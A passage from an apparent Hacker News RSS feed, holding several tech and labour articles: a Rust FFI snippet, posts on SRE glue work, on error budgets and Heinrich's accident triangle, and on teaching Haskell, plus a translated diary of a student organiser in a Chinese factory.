pub struct AnimalVTable {
    speak: extern "C" fn speak(
        VRef&lt;AnimalVTable&gt;, i32, &amp; mut SharedString);
}
</code></pre>
<p>In this case, our virtual table has only one function. It is <code>#[repr(C)]</code> so that
cbindgen can generate a structure that the C++ code can access. Since we can't use <code>String</code>
we changed the return type to <code>SharedString</code>. We also pass the parameter by mutable reference instead
of just returning it, because it is not allowed to return a type that has a destructor.<br>
Instead of passing a trait object, our functions receive a pointer to the virtual table and
a …</p></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html">https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html</a></em></p>]]>
            </description>
            <link>https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25819763</guid>
            <pubDate>Mon, 18 Jan 2021 09:07:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Most Underappreciated Skill for SREs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25819011">thread link</a>) | @kiyanwang
<br/>
January 17, 2021 | https://www.blameless.com/blog/the-most-underappreciated-skill-for-sres | <a href="https://web.archive.org/web/*/https://www.blameless.com/blog/the-most-underappreciated-skill-for-sres">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Delivering great software and sustainable systems is a team sport. Without the support of all stakeholders, adoption initiatives often fail.&nbsp; In successful initiatives, SREs are responsible for bringing together all resources and team members to help resolve reliability-related issues.<br></p><p>But getting together these resources takes much more effort than people think. SREs engage in lots of glue work to ensure these collaborative efforts happen. <a href="https://noidea.dog/glue">Glue work</a> refers to tasks that are essential to a project’s success, even if they don't contribute to the codebase.&nbsp;<br></p><p>Unfortunately, glue work often goes unrecognized as it can be more difficult to measure. It's important to learn what goes into glue work and focus on ways to appreciate those who do it. In this blog post, we’ll highlight some examples of glue work SREs perform: building a common language, forging connections, and establishing culture.</p><h3>SREs align stakeholders’ goals with common language</h3><p>For a project to succeed, people must be aligned around a shared goal. During complex projects where many stakeholders contribute, this can be challenging. Consider an organization-wide goal of boosting customer retention by 25%. Let’s look at how that goal might manifest in different teams:</p><figure id="w-node-95cc7dfdf61b-359a5214"><p><img src="https://uploads-ssl.webflow.com/5ec0224560bd6a6ef89a51ae/5fb29fddad8e1e9ae99c38da_ILIqUUncglNFHrmWimFH_EGCnKdBSntP3j9PZwWEXXlF0OD7s-kisofys3wZionjCu72TPPlhwTqqE3OVW3iQBZn_ByupvU03l_ZtIKMPr2zha_WjDIplB_olhdxRPxNHChG4NY.png" alt=" Role Goal Projects Executive Boost customer retention by 25% Strategically plan the organization’s trajectory Management Link team success to customer retention and analyze data Assign work that supports team goals and report on progress Development Develop features that increase product stickiness Develop a more intuitive page navigation system Operations Keep services functioning and reduce churn related to product quality or incidents Improve incident response systems and procedures"></p></figure><p>‍<br></p><p>Although each team’s work shares an ultimate goal, the tasks they work on end up being very different. Teams can become demotivated if their work isn’t reflected in the overall success of the organization. Additionally, teams can lose sight of the main goal: increased customer happiness.<br></p><p>SREs can help glue these projects together by establishing a common language. In <a href="https://www.blameless.com/blog/resilience-in-action-episode-5">episode 5</a> of the Resilience in Action podcast, Eric Roberts, Sr. Manager of SRE at Under Armour, discusses how important this was to his team's success. “We really needed a framework to get alignment across these teams, because they don't all work the same way. We also needed alignment on how we measure success for ourselves.”<br></p><p>Eric recommends <a href="https://www.blameless.com/blog/service-level-objectives-slos-lessons-learned">SLOs</a> and <a href="https://www.blameless.com/blog/slis-understand-users-needs">user journeys</a> as a unifying language between teams. These provide metrics that illustrate customer satisfaction and represent organization-wide goals. At the same time, they also reflect changes made on specific technical projects. This helps the organization move together towards one goal. This achievement is so powerful that Eric describes it as his most gratifying. “For me, [the most gratifying thing] is establishing an idea or a goal and convincing everybody that this is the right thing to do. You see the momentum turn the corner and then everybody's talking about it.‍”<br></p><p>SREs build this common language through glue work practices such as:<br></p><ul role="list"><li>Developing shared classifications and policies for projects and incidents.</li><li>Codifying knowledge by writing runbooks that are usable by many teams.</li><li>Consolidating monitoring data into something meaningful to all stakeholders.</li><li>Creating reports, stories, and presentations that make findings more accessible.</li><li>Shoring up documentation by building standards and filling in gaps.</li></ul><h3>SREs bring people together in inspiring ways</h3><p>One of the clearest examples of SRE glue work is bringing people together who might otherwise not meet. On the <a href="https://www.blameless.com/blog/resilience-in-action-episode-5">Resilience in Action podcast</a>, Principal SRE at Gremlin Tammy Bryant talks about the game days her team runs at Gremlin. “We were running these really awesome game days where we would invite the entire company to come along and see... That actually worked really well for a long time.”<br></p><p>As Gremlin grew, the team needed to scale game days. The team worked together to create a new plan. “We use the Donut bot to match people into mini game days with three people running a game day together. The engineers are running the game day and we're there to take their feedback always. Everyone gets to say what they think should be done to improve. That's a really big thing I think is important. You've always got to listen to everyone. Because if people don't like it or don't want to do it, then you're going to hear about it. That's the same for every single SRE practice.”<br></p><p>This is a key mentality: give everyone a chance to share their feelings, as well as a chance to listen. Rather than run from it, embrace any criticism that emerges. These discussions encourage people to air grievances from their unique perspectives. They contextualize their challenges in a way that the other participants can understand. This allows team members to build an empathetic bridge, and dig deeper into incident contributing factors or spirited debate of ideas<br></p><p>Though people can be wary of adding more meetings to the calendar, this is a critical opportunity to connect. Pitch these gatherings in a way that stimulates creativity. Eric recommends rebranding them as brainstorming sessions.<br></p><p>SRE practices lend themselves well to generating these opportunities to meet. Documentation, such as <a href="https://www.blameless.com/blog/incident-retrospective-postmortem-template">incident retrospectives</a>, is built and reviewed collaboratively. Chaos engineering and other experiments require planning and review meetings. Inviting people typically outside these teams can forge fruitful bonds. And allow internal stakeholders greater insight into the hard work the engineering team is doing.</p><h3>SREs grow an empathetic, trusting culture</h3><p>In the above examples, a common element was a cultural shift motivated by a practical change. This culture building is the most valuable part of SRE glue work, but also the most challenging. On the <a href="https://www.blameless.com/blog/resilience-in-action-episode-5">Resilience in Action podcast</a>, Equinix Staff SRE Amy Tobey explains: “It always seems that the hardest part of doing SRE work isn't the technical stuff...These implementation processes are almost more of a cultural change than a technical implementation.”<br></p><p>It was a lesson learned out of necessity, as she describes the process of “hitting heads against the wall” in trying to improve reliability with technology alone. Finally, she had an epiphany. “If I'm going to fix this, I've got to do people work.” The glue work of SREs may not always seem connected to the bottom line. But in making these connections, a much more successful culture can emerge.<br></p><p>In her presentation <a href="https://noidea.dog/#/glue/">Being Glue</a>, Tanya Reilly explores the culture that glue work can create, and the challenges of taking on glue work. Glue work often falls on people who volunteer to complete it. People don’t volunteer equally—for example, <a href="https://hbr.org/2018/07/why-women-volunteer-for-tasks-that-dont-lead-to-promotions">a study</a> showed that women volunteer 48% more often than men for work that is “non-promotable”. As glue work is often overlooked when assessing eligibility for promotion, it is susceptible to such biased distribution.<br></p><p>Recognizing and appreciating glue work needs to be foundational to your organization’s culture. People ending up responsible for work that will receive no recognition is a surefire route to burnout. Creating systems to fairly divide glue work is itself glue work. Those who take on glue work are also often responsible for anticipating and managing burnout. It isn’t a system that can correct itself, but one that requires the entire team to behave with empathy.&nbsp;<br></p><p>SREs can also help people practice empathy and trust in many other circumstances:<br></p><ul role="list"><li>When things go wrong, rather than point fingers, address the issue blamelessly.</li><li>When goals seem misaligned, seek common ground in user satisfaction.</li><li>Hear others’ unique perspectives and connect their challenges with yours.<br></li></ul><p>When you consider the costs of lack of trust, which has heavy consequences such as attrition, the value of this empathetic culture becomes obvious. SRE glue work builds practices that encourage these modes of collaboration. Tools like SLOs and incident retrospectives help people align their goals. With their goals aligned, engineering teams generate conversation, sparking new ideas and digging into issues. The cultural foundation of your organization is based on this glue work, so don’t overlook it.<br></p><p>Blameless provides the tools to make glue work for SREs easier, as well as more recognizable. Want to see how you can build a connected and empathetic culture while boosting reliability? Check out our customer stories such as <a href="https://www.blameless.com/case-study/vital-safeguards-patient-experience-with-blameless">Vital ER’s process and culture transformation</a>. And if you’re ready to give Blameless a spin, try our <a href="https://www.blameless.com/try-now">free sandbox</a>.&nbsp;<br></p><p>If you enjoyed this blog post, check these resources out:</p><ul role="list"><li><a href="https://www.blameless.com/blog/look-upstream-to-solve-your-teams-reliability-issues">Look Upstream to Solve your Team's Reliability Issues</a></li><li><a href="https://www.blameless.com/blog/4-ways-sre-helps-new-employees-onboard">Here are 4 Ways SRE Helps New Employees Onboard</a></li><li><a href="https://www.blameless.com/blog/how-to-thrive-in-a-post-covid-world">Industry Experts Explain how to Thrive in a Post-COVID World</a></li></ul></div></div>]]>
            </description>
            <link>https://www.blameless.com/blog/the-most-underappreciated-skill-for-sres</link>
            <guid isPermaLink="false">hacker-news-small-sites-25819011</guid>
            <pubDate>Mon, 18 Jan 2021 06:57:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Error budgets and the legacy of Herbert Heinrich]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25818980">thread link</a>) | @kiyanwang
<br/>
January 17, 2021 | https://surfingcomplexity.blog/2021/01/10/error-budgets-and-the-legacy-of-herbert-heinrich/ | <a href="https://web.archive.org/web/*/https://surfingcomplexity.blog/2021/01/10/error-budgets-and-the-legacy-of-herbert-heinrich/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Here’s a question that all of us software developers face: <em>How can we best use our knowledge about the past behavior of our system to figure out where we should be investing our time?</em></p>



<p>One approach is to use a technique from the SRE world called <em>error budgets</em>. Here are a few quotes from the <em>How to Use Error Budgets</em> chapter of Alex Hidalgo’s book: <strong><em>Implementing Service Level Objectives</em></strong>:</p>



<p><em>Measuring error budgets over time can give you great insight into the <strong>risk factors</strong> that impact your service, both in terms of frequency and <strong>severity</strong>. By knowing what kinds of events and failures are bad enough to burn your error budget, even if just momentarily, you can better discover what factors cause you the most problems over time.</em> p71 [emphasis mine]</p>



<p><em>The basic idea is straightforward. If you have error budget remaining, ship new features and push to production as often as you’d like; once you run out of it, stop pushing feature changes and focus on relaiability instead. p87</em></p>



<p><em>Error budgets give you ways to make decisions about your service, be it a single microservice or your company’s entire customer-facing product. They also give you indicators that tell you when you can ship features, what your focus should be, when you can experiment, and what your biggest risk factors are.</em> p92</p>



<p><em>The goal is not to only react when your users are extremely unhappy with you—it’s to have better data to discuss where work regarding your service should be moving next. </em>p354</p>



<p>That sounds reasonable, doesn’t it? Look at what’s causing your system to break, and if it’s breaking too often, use that as a signal to address those issues that are breaking it. If you’ve been doing really well reliability-wise, an error budget gives you margin to do some riskier experimentation in production like chaos engineering or production load testing.</p>



<p>I have two issues with this approach, a smaller one and a larger one. I’ll start with the smaller one.</p>



<p>First, I think that if you work on a team where the developers operate their own code (you-build-it, you-run-it), and where the developers have enough autonomy to say, “We need to focus more development effort on increasing <em><a href="https://github.com/lorin/resilience-engineering/blob/master/intro.md#what-is-resilience">robustness</a>”, </em>then you don’t need the error budget approach to help you decide when and where to spend your engineering effort. The engineers will know where the recurring problems are because they feel the operational pain, and they will be able to advocate for addressing those pain points. This is the kind of environment that I am fortunate enough to work in.</p>



<p>I understand that there are environments where the developers and the operators are separate populations, or the developers aren’t granted enough autonomy to be able to influence where engineering time is spent, and that in those environments, an error budget approach would help. But I don’t swim in those waters, so I won’t say any more about those contexts.</p>



<p>To explain my second concern, I need to digress a little bit to talk about Herbert Heinrich.</p>



<hr>



<p>Herbert Heinrich worked for the Travelers Insurance Company in the first half of the twentieth century. In the 1920s, he did a study of workplace accidents, examining thousands of claims made by companies that held insurance policies with Travelers. In 1931, he published his findings in a book: <em><a href="https://www.worldcat.org/title/industrial-accident-prevention-a-scientific-approach/oclc/3493629">Industrial Accident Prevention: A Scientific Approach</a></em>. </p>



<p>Heinrich’s work showed a relationship between the rates of near misses (no injury), minor injuries, and major injuries. Specifically: for every major injury, there are 29 minor injuries, and 300 no-injury accidents. This finding of 1:29:300 became known as the <em>accident triangle</em>.</p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/01/heinrich-1.jpg"><img data-attachment-id="1750" data-permalink="https://surfingcomplexity.blog/heinrich-1/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/01/heinrich-1.jpg" data-orig-size="762,476" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="heinrich-1" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/01/heinrich-1.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/01/heinrich-1.jpg?w=762" src="https://lorinhochstein.files.wordpress.com/2021/01/heinrich-1.jpg?w=762" alt="" srcset="https://lorinhochstein.files.wordpress.com/2021/01/heinrich-1.jpg 762w, https://lorinhochstein.files.wordpress.com/2021/01/heinrich-1.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/01/heinrich-1.jpg?w=300 300w" sizes="(max-width: 762px) 100vw, 762px"></a><figcaption>My reproduction of Heinrich’s accident pyramid. To see the original, check out <a href="https://risk-engineering.org/concept/Heinrich-Bird-accident-pyramid">The Heinrich/Bird safety pyramid: Pioneering research has become a safety myth</a> at <a href="https://risk-engineering.org/">risk-engineering.org</a>.</figcaption></figure>



<p>One implication of the accident triangle is that the rate of minor issues gives us insight into the rate of major issues. In particular, if we reduce the rate of minor issues, we reduce the risk of major ones. Or, as Heinrich put it: <em>Moral—prevent the accidents and the injuries will take care of themselves.</em></p>



<p>Heinrich’s work has since been criticized, and subsequent research has contradicted Heinrich’s findings. I won’t repeat the criticisms here (see <em><a href="https://www.taylorfrancis.com/books/foundations-safety-science-sidney-dekker/e/10.4324/9781351059794">Foundations of Safety Science</a></em> by Sidney Dekker for details), but I will cite counterexamples mentioned in Dekker’s book:</p>



<p>The <a href="https://en.wikipedia.org/wiki/Deepwater_Horizon#Explosion_and_oil_spill">Deepwater Horizon offshore drilling rig</a> saw six years of injury-free and incident-free performance before the explosion in 2010. (It even <a href="https://abcnews.go.com/Blotter/louisiana-oil-spill-feds-gave-safety-prize-transoceans/story?id=10528236#:~:text=MMS%20issued%20its%20SAFE%20award,be%20taken%20as%20evidence%20of">won a SAFE award from the U.S. Minerals Management Service in 2008 for its perfect safety record!</a>)</p>



<p>Arnold Barnett and Alexander Wang found a negative correlation between nonfatal accident/incident rates and passenger-mortality risk among air carriers. That is, carriers that had more non-fatal incidents had a lower risk of fatalities. (<a href="https://flightsafety.org/fsd/fsd_apr00.pdf">Passenger-mortality Risk Estimates Provide Perspectives About Airline Safety, Flight Safety Digest, April 2000</a>).</p>



<p>Antti Saloniemi and Hanna Oksanen found a negative correlation between incident rate and fatalities in the construction industry in Finland (<a href="https://doi.org/10.1016/S0925-7535(98)00016-2">Accidents and fatal accidents—some paradoxes, Safety Science, Volume 29, Issue 1, June 1998</a>).</p>



<p>Fred Sherratt and Andrew Dainty found that construction companies in the UK that had an explicit policy of zero accidents saw more major injuries and fatal accidents than companies that did not have a zero accident policy  (<a href="https://www.tandfonline.com/doi/abs/10.1080/14773996.2017.1305040">UK construction safety: a zero paradox?, Policy and Practice in Health and Safety, Volume 15, Issue 2, 2017</a>).</p>



<hr>



<p>So, what does any of this have to do with error budgets? At a glance, error budgets don’t seem related to Heinrich’s work at all. Heinrich was focused on safety, where the goal is to reduce injuries as much as possible, in some cases explicitly having a <em>zero</em> goal. Error budgets are explicitly <em><strong>not</strong></em> about achieving zero downtime (100% reliability), they’re about achieving a target that’s below 100%.</p>



<p>Here are the claims I’m going to make:</p>



<ol><li>Large incidents are much more costly to organizations than small ones, so we should work to reduce the risk of large incidents.</li><li>Error budgets don’t help reduce risk of large incidents.</li></ol>



<p>Here’s Heinrich’s triangle redrawn:</p>



<figure><a href="https://lorinhochstein.files.wordpress.com/2021/01/error-budget.jpg"><img data-attachment-id="1752" data-permalink="https://surfingcomplexity.blog/error-budget/" data-orig-file="https://lorinhochstein.files.wordpress.com/2021/01/error-budget.jpg" data-orig-size="784,467" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="error-budget" data-image-description="" data-medium-file="https://lorinhochstein.files.wordpress.com/2021/01/error-budget.jpg?w=300" data-large-file="https://lorinhochstein.files.wordpress.com/2021/01/error-budget.jpg?w=784" src="https://lorinhochstein.files.wordpress.com/2021/01/error-budget.jpg?w=784" alt="" srcset="https://lorinhochstein.files.wordpress.com/2021/01/error-budget.jpg 784w, https://lorinhochstein.files.wordpress.com/2021/01/error-budget.jpg?w=150 150w, https://lorinhochstein.files.wordpress.com/2021/01/error-budget.jpg?w=300 300w, https://lorinhochstein.files.wordpress.com/2021/01/error-budget.jpg?w=768 768w" sizes="(max-width: 784px) 100vw, 784px"></a></figure>



<p>An error-budget-based approach only provides information on the nature of minor incidents, because those are the ones that happen most often. Near misses don’t impact the reliability metrics, and major incidents blow them out of the water.</p>



<p>Heinrich’s work assumed a fixed ratio between minor accidents and major ones: reduce the rate of minor accidents and you’d reduce the rate of major ones. By focusing on reliability metrics as a primary signal for providing insight into system risk, you only get information about these minor incidents. But, if there’s no relationship between minor incidents and major ones, then maintaining a specific reliability level doesn’t address the issues around major incidents at all.</p>



<p>An error-budget-based approach to reliability <strong><em>implicitly assumes there is a connection between reliability metrics and the risk of a large incident</em></strong>. This is the thread that connects to Heinrich: the unstated idea that doing the robustness work to address the problems exposed by the smaller incidents will decrease the risk of the larger incidents.</p>



<p>In general, I’m skeptical about relying on predefined metrics, such as reliability, for getting insight into the risks of the system that could lead to big incidents. Instead, I prefer to focus on <em>signals</em>, which are not predefined metrics but rather some kind of information that has caught your attention that suggests that there’s some aspect of your system that you should dig into a little more. Maybe it’s a near-miss situation where there was no customer impact at all, or maybe it was an offhand remark made by someone in Slack. Signals by themselves don’t provide enough information to tell you where unseen risks are. Instead, they act as clues that can help you figure out where to dig to get more details. This is what the <a href="https://www.learningfromincidents.io/">Learning from Incidents in Software</a> movement is about.</p>



<p>I’m  generally skeptical of metrics-based approaches, like error budgets, because they <em>reify</em>. The things that get measured are the things that get attention. I prefer to rely on qualitative approaches that leverage the experiment judgment of engineers. The challenge with qualitative approaches is that you need to expose the experts to the information they need (e.g., putting the software engineers on-call), and they need the space to dig into signals (e.g., allow time for incident analysis). </p>
	</div></div>]]>
            </description>
            <link>https://surfingcomplexity.blog/2021/01/10/error-budgets-and-the-legacy-of-herbert-heinrich/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818980</guid>
            <pubDate>Mon, 18 Jan 2021 06:52:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Factory diaries: My life as an undercover student worker]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25818975">thread link</a>) | @viburnum
<br/>
January 17, 2021 | https://lausan.hk/2021/factory-diaries-undercover-student-worker/ | <a href="https://web.archive.org/web/*/https://lausan.hk/2021/factory-diaries-undercover-student-worker/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
																										
<div><p>Original: 【工廠日記：一名進廠學生的躊躇與行動】, published in <a href="https://matters.news/@masses2020/%E5%B7%A5%E5%AD%A6%E8%81%94%E7%9B%9F-%E5%B7%A5%E5%8E%82%E6%97%A5%E8%AE%B0-%E4%B8%80%E5%90%8D%E8%BF%9B%E5%8E%82%E5%AD%A6%E7%94%9F%E7%9A%84%E8%B8%8C%E8%BA%87%E4%B8%8E%E8%A1%8C%E5%8A%A8-bafyreia3qkcusx2aancnr6tmvqol56wp2cclt2mvp5u55a2jm3mzqhazx4">Masses</a></p><p>Translators: Chin Kinnan, Ariel Padam</p><p>This article has been edited for clarity and precision. If you would like to be involved in our translation work, please get in touch&nbsp;<a href="https://lausan.hk/contact/">here</a>.</p></div>



<h4>Editor’s note</h4>



<p>In 2010, the same year in which multiple workers <a href="https://lausan.hk/2020/15-years-student-mother-foxconn-worker/">leapt to their deaths</a> at Foxconn, a Marxist high school student group began sending members into factories, hoping to mobilize and organize workers in order to advance a labor movement. Passionate and idealistic, these left-wing students entered the factories, filled with revolutionary fervor. Not only did they endure hard physical labor, but they also navigated confusion and frustration as they tried to organize fellow workers. In these diaries, the author candidly reflected on the helplessness the group had felt during that intense period.</p>



<p>One recurring question he had to confront was how student activists could awaken fellow workers’ sense of class consciousness, so that they could work towards self-determination. Due to the high turnover rate among workers, it was difficult to develop stable relationships. In reality, workers’ resistance against the sweatshops was often passive and nihilistic in nature: workers preferred finding a different employer, rather than pursuing legal action or going on strike. The author also frequently questioned his “petit bourgeois” shortcomings―looking more like a student than a worker, and having a quiet and subdued persona―that prevented him from gaining fellow workers’ trust. All in all, seemingly trivial yet concrete everyday matters became unavoidable obstacles in coalition building.&nbsp;</p>



<hr>



<h4>Prologue</h4>



<p>My persona at the factory had been that of a high school dropout who had failed his college entrance exams. When I quit, I lied to the section chief that I was returning to my studies and needed to study for college. I didn’t mean to deliberately hide my identity, but I felt the lie necessary in order for me to continue organizing the workers there. The section chief gladly approved my resignation, and wholeheartedly advised the line and group chiefs to let me go. My departure was very smooth, and I got my wages without a hitch. </p>



<p>To be honest, I was grateful. When others in my line found out I was going back to my studies, they were very supportive. They knew that without an education―to be “uncultured”―it is difficult to get ahead in this dog-eat-dog world. I was ashamed, as it was gut-wrenching to lie to them. They had told me their stories, and treated me with honesty and respect. On more than a few occasions, I was tempted to tell them the truth, but I continued to do them wrong; I can only leave my apologies on these pages instead.</p>



<p>I remember the day I first walked into this factory. For someone who had lived in Northern China all his life, even though I’ve worked before, it was my first time being in the South. I had never seen such a vast operation: each work area stacked up against another. Sure enough, it turned out to be a place defined by capital. Seeing the deluge of workers during shift changes, it was difficult to imagine the lives of these migrant workers, so far away from their home. </p>



<p>In 25 endless days and nights, I repeatedly struggled with myself and within this godforsaken factory. I was assigned to the materials crew, which wasn’t an easy job: “easy” didn’t exist here. With some trepidation, I started my work. Eyeing my workstation, there was a deep sense of foreboding and pressure. I didn’t understand Southern dialects, and it dawned on me how it must feel to be alone―and lonely―in my work area. I wondered how much worse the alienation must be for the average Foxconn worker. </p>



<p>At times, my heart ached. I would sometimes go to the plaza with my coworkers to watch people dance or go to the movies, but sometimes I would just hole up in the dormitory, gazing at the underside of the top bunk, listening to the monotonous tick-tock of the clock, drifting slowly off to sleep. We all wished we could dream, to pass these long summer nights. But more often than not, in the sweltering heat of the South, we would jerk awake in the middle of the night, drenched in sweat.&nbsp;</p>



<h4>Arrival</h4>



<p><strong>Tuesday, 20th July 2010</strong></p>



<p>Today I finally made it into the factory. It was quite an ordeal. The factory is called XX Industrial Products Limited. The site itself spans about one hectare, with 500 workers―as the security team leader pointed out during training―and four dormitory buildings: one male and one female dorm each for workers and two for staff, with the two workers’ dorms facing each other. Each room houses eight people with a few housing up to 12 people, and the buildings were built in the 1990s with dated amenities. The windows barely have any glass; the doors are so warped that they couldn’t be locked. The whole setup is as sparse as that of a junior high dorm. Each floor has one shower and bathroom―four toilets and six shower stalls in total. The shower stall is set up in as crude a way as imaginable: it does not have a faucet or hot water, so you’d have to take a bucket of water to the stall. All in all, the facilities are dilapidated, and corridors have areas with standing water. No wonder many workers prefer to rent and live elsewhere.&nbsp;</p>



<p>From chatting with a few co-workers in my dorm, I found out that the factory now has 300 or so people, with a lot of turnover. Based on what I saw at orientation, many workers are high school graduates here for a summer job, or are temp workers. Those who are here for the long haul make up about 50% of the group. Among the few people in my dorm, the cohort from Guangxi doesn’t plan on staying long, and will leave when they make enough spending money (which would turn out to be three months). There are two high school graduates from Henan, who plan to bail after the summer. Another third-year university student from Henan is here for summer break to make some money. A guy from Dazhou, Sichuan has been working here for a year, and is a long-term employee. According to the two youngsters from Henan, this factory has been open for a little over a year, so those who’ve been here for that long can be considered long-term workers. In my few days of being here, several people have already come and gone, mostly because the dorms are in such poor conditions. Not only would the water be cut off every now and then at night, you would get rashes from bug bites. All in all, eight people have come and gone. The two kids are leaving tonight to live elsewhere. That way they can sleep better and not fall asleep during the day.</p>



<p><strong>Wednesday, 21st July 2010</strong></p>



<p><em>Shift ended at 9:30pm, worked for a total of 11 hours</em></p>



<p>Today was my first day of work, and also my first time eating breakfast here at the factory. My goodness. The breakfast consisted of a portion of chow mein, and a bowl of short-grain rice gruel; the rice seemed to have been boiled, which was pretty unappetizing. In truth, the two dishes would normally go well together, except that the chow mein was unsalted and had a weird taste. Overall, the cafeteria food here is pretty grim. The winter melon in the soup was not cleaned properly, and the vegetables didn’t have any oil to taste. Lunch and supper each had only two dishes, and each dish was half a scoop.</p>



<p>The factory uses electrical fans exclusively, so the circulation isn’t too bad. What’s lacking are co-ed toilets; we only have four shared stalls shared by all men and women. That’s really inconvenient. The so-called free drinking water provided in each section, which I originally thought was mineral water, is just tap water bottled up in mineral water bottles. Our entire assembly outfit has 150 people or so, spread across four lines. By rough estimates, 70 to 80 people are temp or summer workers, many of whom are not even 16 years old. The rest won’t be here for long either, with the majority working three to four months at most. Most of us on the line are pretty lazy, unless the foremen are lurking nearby and monitoring us. We spend a lot of time dicking around and being idle, so the efficiency is pretty low. Our line manager likes to fuck with us from time to time, but I don’t say much and keep my head down at work. Hopefully, that way I’d stay on his good side.&nbsp;</p>



<p>Every day I repeat the same movement 1,791 times. I’d often lose my train of thought during work, but my hands would keep moving. I suppose this is the point of mechanical labor: you can work even when your brain is asleep. I perform this task 700 times in the morning, 700 times in the afternoon, and 391 times during my overtime at night. It’s tiring just sitting there all by yourself without anyone to talk to, so fatigue sets in easily. </p>



<p>At night, I chatted with a coworker who had come to the factory two months ago, and he didn’t even know how much his wages are. You can’t blame him entirely, as he hasn’t been paid yet. His salary in May has been held as a “deposit,” and his June salary wouldn’t be paid until the end of this month. He still doesn’t know how much he’s getting paid, or whether he had signed a contract. This was surprising to me, as the law stipulates that factories must let workers know when they start work. Should I warn him?&nbsp;</p>



<p>Another noteworthy thing happened today. Three guys who started with me have decided to quit and find work at a different factory. According to them, this factory is in violation of the Labor Contract Law: taking into account 28 working days and two vacation days with daily overtime of three to four hours, the hourly wage at this factory is about US¢59. In addition, the living conditions are terrible, which made their lives miserable. You don’t&nbsp;get paid on time, the food is bad, and at night you’re ravaged by mosquitoes and other pests. The conditions here are no different from the Chinese factories of the 1990s.&nbsp;&nbsp;</p>



<p><strong>Thursday, 22nd July 2010</strong></p>



<p><em>Shift ended at 9:30pm, worked for a total of 11 …</em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lausan.hk/2021/factory-diaries-undercover-student-worker/">https://lausan.hk/2021/factory-diaries-undercover-student-worker/</a></em></p>]]>
            </description>
            <link>https://lausan.hk/2021/factory-diaries-undercover-student-worker/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818975</guid>
            <pubDate>Mon, 18 Jan 2021 06:52:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teaching Haskell means teaching important concepts]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25818697">thread link</a>) | @io_nathan
<br/>
January 17, 2021 | http://www.lambdabytes.io/posts/teachinghaskell/ | <a href="https://web.archive.org/web/*/http://www.lambdabytes.io/posts/teachinghaskell/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="article">
        <p>I am teaching Haskell in the 1st semester Computer Science Master course <em>Concepts of higher programming languages</em> course. Why did I decide for Haskell and not Python, JavaScript (JS), TypeScript (TS), Scala, Erlang, Rust, <em>Your Favourite Programming Language</em>?</p>
<p>At this point I assume and expect that students are not only familiar with mainstream object-oriented programming (Java, C#) but that they more or less excel in it - they don’t have to be experts (nor can they, unless they have worked for many years in the industry), but they should be very confident and be able to write larger, complex applications in a proper OO way.</p>
<p>Getting into another OOish language like Python, JS, TS would be simply a waste of time. Therefore, I was contemplating teaching the central concepts of Haskell, Erlang and Rust. For Rust that would be its <em>borrowing</em> feature and how it achieves safe memory management, for Erlang that would be <em>Actors and shared-nothing-semantics message-passing</em>; and for Haskell… well it would be <em>Monads</em> but for the students to fully get it I realised that I would need to give a proper introduction into the whole language (following along the lines of Graham Huttons brilliant Book <em>Programming in Haskell (2nd ed.)</em> and extending it).</p>
<p>So I decided to go for “Haskell only” and it turned out to be the right decision, especially for a course on <em><strong>Concepts</strong></em> <em>of higher programming languages</em>. Haskell allows to discuss many concepts in the context of a pure functional language which makes it especially suitable for such a course. Of course, some concepts the students “know” from OO as they have found their way into mainstream by now but the way these concepts are presented and need to be dealt with in Haskell is in such a pure way that students will learn and get the most out of it. Sure, I could have also decided to teach the concepts in JS but they would come across as muddled and not very clear - and some of these concepts would simply not have been possible in JS (or would have been a crude and ugly workaround, with the deeper idea completely hidden underneath).</p>
